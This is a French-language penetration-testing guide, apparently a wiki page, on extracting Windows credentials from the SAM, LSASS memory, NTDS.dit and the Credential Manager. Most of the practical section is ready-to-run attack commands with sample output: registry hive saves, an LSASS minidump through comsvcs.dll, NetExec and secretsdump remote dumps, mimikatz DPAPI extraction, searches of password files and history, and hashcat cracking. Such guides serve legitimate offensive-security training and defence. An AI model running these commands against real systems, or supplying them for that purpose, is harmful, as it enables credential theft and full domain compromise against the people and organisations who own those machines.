# Extraction de credentials Windows

Windows stocke les credentials a plusieurs endroits : la base SAM pour les comptes locaux, le processus LSASS en memoire, NTDS.dit pour l'Active Directory, et le Credential Manager pour les mots de passe sauvegardes. Chacune de ces sources peut etre attaquee avec les bons privileges et les bons outils.

## Pourquoi

Apres avoir obtenu un acces initial sur un systeme Windows (exploitation, credentials trouves), l'etape suivante est d'extraire le maximum de credentials pour progresser dans le reseau. Un seul hash NTLM administrateur de domaine recupere dans LSASS peut donner le controle complet de l'AD.

## Comment ca marche

### Architecture d'authentification Windows

Le processus d'authentification Windows implique plusieurs composants.

| Composant | Role |
|---|---|
| **WinLogon** | Intercepte les credentials a la connexion |
| **LSASS** | Verifie les credentials, stocke les tokens en memoire |
| **SAM** | Base de donnees des comptes locaux (hashs NTLM) |
| **NTDS.dit** | Base AD sur les controleurs de domaine |
| **Credential Manager** | Stocke les mots de passe sauvegardes (RDP, partages, navigateurs) |

{% hint style="info" %}
Sur une machine jointe a un domaine, l'authentification est validee par le controleur de domaine, pas par la SAM locale. Mais la SAM reste accessible pour les comptes locaux, et LSASS cache en memoire les credentials des sessions actives.
{% endhint %}

## En pratique

### Attaque de la SAM

La SAM est stockee dans le registre Windows (`HKLM\SAM`). Pour extraire les hashs, il faut des privileges administrateur.

{% tabs %}
{% tab title="Local (reg.exe)" %}
```powershell
# - Sauvegarder les ruches du registre
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# - Transferer vers la machine d'attaque
# Via smbserver, SCP, ou tout autre moyen
```
{% endtab %}
{% tab title="Distant (NetExec)" %}
```bash
# - Dumper la SAM a distance
netexec smb <IP_CIBLE> --local-auth -u admin -p 'Password123' --sam

# - Dumper les LSA secrets a distance
netexec smb <IP_CIBLE> --local-auth -u admin -p 'Password123' --lsa
```
{% endtab %}
{% endtabs %}

```bash
# - Extraire les hashs offline avec secretsdump
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

# Resultat :
# Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# bob:1001:aad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

Le format de sortie est `user:rid:lmhash:nthash`. La partie NTLM (les 32 derniers caracteres hex) est le hash a casser ou a utiliser pour Pass-the-Hash.

### Attaque de LSASS

LSASS stocke en memoire les credentials des sessions actives. Dumper sa memoire donne acces aux hashs NTLM, tickets Kerberos, et parfois aux mots de passe en clair.

{% tabs %}
{% tab title="Dump via GUI" %}
Ouvrir le Gestionnaire des taches, onglet Processus, clic droit sur `Local Security Authority Process`, puis `Creer un fichier dump`. Le fichier `lsass.DMP` est sauvegarde dans `%temp%`.
{% endtab %}
{% tab title="Dump via CLI" %}
```powershell
# - Trouver le PID de LSASS
tasklist /svc | findstr lsass
# lsass.exe    672   KeyIso, SamSs, VaultSvc

# - Dumper avec rundll32 et comsvcs.dll
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
{% endtab %}
{% endtabs %}

```bash
# - Analyser le dump avec pypykatz (Linux)
pypykatz lsa minidump lsass.dmp

# Resultat :
# username: bob
# NT: 64f12cddaa88057e06a81b54e73b949b
# (parfois aussi le mot de passe en clair via WDigest)
```

{% hint style="warning" %}
Les AV et EDR modernes detectent et bloquent le dump de LSASS. Le Credential Guard de Windows 10/11 isole LSASS dans une enclave virtuelle, rendant le dump impossible par les methodes classiques.
{% endhint %}

### Attaque de NTDS.dit

Sur un controleur de domaine, NTDS.dit contient tous les hashs de tous les comptes du domaine.

```bash
# - Dumper NTDS.dit a distance avec secretsdump
secretsdump.py -just-dc <DOMAIN>/<admin>:<password>@<IP_DC>

# - Ou avec NetExec
netexec smb <IP_DC> -u admin -p 'Password123' --ntds

# Resultat :
# inlanefreight.local\Administrator:500:aad3b435b51404ee:...:::
# inlanefreight.local\krbtgt:502:aad3b435b51404ee:...:::
```

{% hint style="danger" %}
Dumper NTDS.dit donne acces a TOUS les comptes du domaine, y compris `krbtgt`. C'est l'equivalent de la compromission totale du domaine.
{% endhint %}

### Credential Manager et DPAPI

Le Credential Manager stocke les mots de passe sauvegardes (navigateurs, connexions RDP, partages reseau). Les donnees sont chiffrees avec DPAPI (Data Protection API).

```bash
# - Lister les credentials sauvegardees
cmdkey /list

# - Extraire avec mimikatz
mimikatz # vault::cred /patch
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

# - Extraction distante avec DonPAPI
DonPAPI <DOMAIN>/<user>:<password>@<IP_CIBLE>
```

### Recherche de credentials sur un systeme Windows

```powershell
# - Rechercher des fichiers contenant des mots de passe
findstr /si password *.txt *.ini *.config *.xml

# - Fichiers de configuration courants
type C:\inetpub\wwwroot\web.config
type C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml

# - Historique PowerShell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# - Registre (mots de passe autologon)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

## Pieges et galeres

- **Privileges insuffisants** : le dump de SAM et LSASS necessite des droits administrateur local. Le dump de NTDS.dit necessite un acces Domain Admin ou equivalent
- **Credential Guard** : sur les systemes modernes avec Credential Guard active, le dump de LSASS ne retournera que des hashs partiels ou rien du tout
- **LSASS protege** : depuis Windows 8.1, LSASS peut etre configure en processus protege (PPL), ce qui bloque le dump classique
- **DCC2 vs NTLM** : les hashs caches dans SECURITY (DCC2) sont environ 800x plus lents a casser que les NTLM. Privilegier les hashs SAM/LSASS

## Memo express

| Commande | Usage |
|---|---|
| `reg.exe save hklm\sam C:\sam.save` | Sauvegarder la SAM |
| `secretsdump.py -sam sam -system sys LOCAL` | Extraire les hashs offline |
| `netexec smb <IP> -u admin -p pass --sam` | Dump SAM distant |
| `netexec smb <IP> -u admin -p pass --lsa` | Dump LSA distant |
| `pypykatz lsa minidump lsass.dmp` | Analyser un dump LSASS |
| `secretsdump.py -just-dc domain/admin:pass@DC` | Dump NTDS.dit |
| `hashcat -m 1000 hash rockyou.txt` | Casser des hashs NTLM |

***
